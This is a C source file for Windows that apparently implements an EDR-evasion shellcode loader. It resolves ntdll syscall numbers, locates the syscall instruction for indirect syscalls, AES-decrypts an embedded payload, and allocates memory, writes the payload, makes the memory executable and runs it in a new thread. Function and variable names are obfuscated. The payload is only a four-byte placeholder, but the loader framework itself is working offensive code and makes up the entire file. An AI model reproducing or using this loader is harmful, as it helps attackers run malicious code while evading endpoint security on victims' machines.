#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
#include <stdlib.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

DWORD FnAllocvm_num;
DWORD FnWrvm_num;
DWORD FnProtvm_num;
DWORD FnCrth_num;
DWORD FnSo_num;

UINT_PTR instruct_addr_of_s;

typedef struct _PS_ATTRIBUTE
{
	ULONG  Attribute;
	SIZE_T Size;
	union
	{
		ULONG Value;
		PVOID ValuePtr;
	} u1;
	PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
	(p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
	(p)->RootDirectory = r;                           \
	(p)->Attributes = a;                              \
	(p)->ObjectName = n;                              \
	(p)->SecurityDescriptor = s;                      \
	(p)->SecurityQualityOfService = NULL;             \
}
#endif

typedef struct _CLIENT_ID
{
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T       TotalLength;
	PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

EXTERN_C NTSTATUS FnAllocvm(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG ZeroBits,
	PSIZE_T RegionSize,
	ULONG AllocationType,
	ULONG Protect);

EXTERN_C NTSTATUS FnWrvm(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten);

EXTERN_C NTSTATUS FnProtvm(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

EXTERN_C NTSTATUS FnCrth(
	PHANDLE ThreadHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	HANDLE ProcessHandle,
	PVOID StartRoutine,
	PVOID Argument,
	ULONG CreateFlags,
	SIZE_T ZeroBits,
	SIZE_T StackSize,
	SIZE_T MaximumStackSize,
	PPS_ATTRIBUTE_LIST AttributeList);

EXTERN_C NTSTATUS FnSo(
	HANDLE Handle,
	BOOLEAN Alertable,
	PLARGE_INTEGER Timeout);

DWORD get_syscall_number(HMODULE handle_mod, LPCSTR syscall_name) {
    DWORD syscall_num = NULL;
    UINT_PTR syscall_addr = NULL;

    syscall_addr = (UINT_PTR)GetProcAddress(handle_mod, syscall_name);
    if (syscall_addr == NULL) {
        printf("\n[-] Couldn't get the address of: %s\n", syscall_name);
        return NULL;
    }

    printf("[+] The address of %s function: 0x%p\n", syscall_name, syscall_addr);
    syscall_num = ((PBYTE)(syscall_addr + 4))[0];
    printf("[+] Got the syscall number: %i\n", syscall_num);
    return syscall_num;
}

void indirect_syscalls(HMODULE handle_mod, LPCSTR syscall_name, UINT_PTR* syscall_inst_address) {
    UINT_PTR syscall_address = NULL;
    BYTE opcodes[2] = { 0x0F, 0x05 };

    syscall_address = (UINT_PTR)GetProcAddress(handle_mod, syscall_name);
    if (syscall_address == NULL) {
        printf("[-] Couldn't get address of the syscall\n");
        return;
    }

    *syscall_inst_address = syscall_address + 0x12;

    if (!memcmp(opcodes, *syscall_inst_address, sizeof(opcodes))) {
        printf("[+] Found syscall instruction!\n");
    }
    else {
        printf("[-] Opcodes didn't match that of syscall instruction");
        return;
    }

}

int ad(BYTE* goodcode, DWORD goodcode_len, char* goodcode_key, size_t goodcode_key_len) {
    HCRYPTPROV pv_h;
    HCRYPTHASH hsh_h;
    HCRYPTKEY ky_h;

    if (!CryptAcquireContextW(&pv_h, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }
    if (!CryptCreateHash(pv_h, CALG_SHA_256, 0, 0, &hsh_h)) {
        return -1;
    }
    if (!CryptHashData(hsh_h, (BYTE*)goodcode_key, (DWORD)goodcode_key_len, 0)) {
        return -1;
    }
    if (!CryptDeriveKey(pv_h, CALG_AES_256, hsh_h, 0, &ky_h)) {
        return -1;
    }

    if (!CryptDecrypt(ky_h, (HCRYPTHASH)NULL, 0, 0, goodcode, &goodcode_len)) {
        return -1;
    }

    CryptReleaseContext(pv_h, 0);
    CryptDestroyHash(hsh_h);
    CryptDestroyKey(ky_h);

    return 0;
}

int main() {
    HMODULE handle_mod = NULL;
    HANDLE handle_thread = NULL;
    HANDLE handle_proc = NULL;
    NTSTATUS status = NULL;
    PVOID base_addr = NULL;
    size_t num_of_bytes_written = 0;
    ULONG old_prot = 0;

    unsigned char pld[] = { 0xb1, 0x0d, 0xb1, 0xed };
    unsigned char pld_key[] = { 0xb1, 0x0d, 0xb1, 0xed };

    ad((BYTE*)pld, sizeof(pld), (char*)pld_key, sizeof(pld_key));

    size_t pld_size = sizeof(pld);
    handle_mod = GetModuleHandleW(L"ntdll.dll");

    FnAllocvm_num = get_syscall_number(handle_mod, "NtAllocateVirtualMemory");
    FnWrvm_num = get_syscall_number(handle_mod, "NtWriteVirtualMemory");
    FnProtvm_num = get_syscall_number(handle_mod, "NtProtectVirtualMemory");
    FnCrth_num = get_syscall_number(handle_mod, "NtCreateThreadEx");
    FnSo_num = get_syscall_number(handle_mod, "NtWaitForSingleObject");
    
    indirect_syscalls(handle_mod, "NtCreateThreadEx", &instruct_addr_of_s);

    handle_proc = GetCurrentProcess();

    status = FnAllocvm(handle_proc, &base_addr, 0, &pld_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        printf("FnAllocvm failed: %i\n", status);
        return 0;
    }
    printf("[+] FnAllocvm succeeded, base address: %p\n", base_addr);

    status = FnWrvm(handle_proc, base_addr, pld, sizeof(pld), &num_of_bytes_written);
    if (status != 0) {
        printf("FnWrvm failed: %i\n", status);
        return 0;
    }
    printf("[+] FnWrvm succeeded. Copied pld to the allocated memory\n");

    status = FnProtvm(handle_proc, &base_addr, &pld_size, PAGE_EXECUTE_READ, &old_prot);
    if (status != 0) {
        printf("[-] FnProtvm failed: %i\n", status);
        return 0;
    }
    printf("[+] FnProtvm succeeded. Changed the protection of the page\n");

    status = FnCrth(&handle_thread, THREAD_ALL_ACCESS, NULL, handle_proc, base_addr, NULL, FALSE, 0, 0, 0, NULL);
    if (status != 0) {
        printf("FnCrth failed: %i\n", status);
        return 0;
    }
    printf("[+] FnCrth succeeded, threaded the thread on the allocated memory\n", handle_thread);

    status = FnSo(handle_thread, FALSE, NULL);
    if (status != 0) {
        printf("FnSo failed: %i\n", status);
        return 0;
    }

    return 0;
}